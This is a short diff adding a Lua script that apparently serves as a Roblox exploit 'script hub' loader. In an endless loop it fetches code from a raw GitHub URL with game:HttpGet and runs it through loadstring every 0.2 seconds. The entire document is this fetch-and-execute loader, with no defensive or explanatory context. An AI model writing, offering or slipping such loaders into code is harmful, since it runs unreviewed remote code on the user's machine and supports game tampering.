@@ -1,0 +1,4 @@
+while true do
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/KATERGaming/Script-Hub/main/massage"))()
+	wait(0.2)
+end
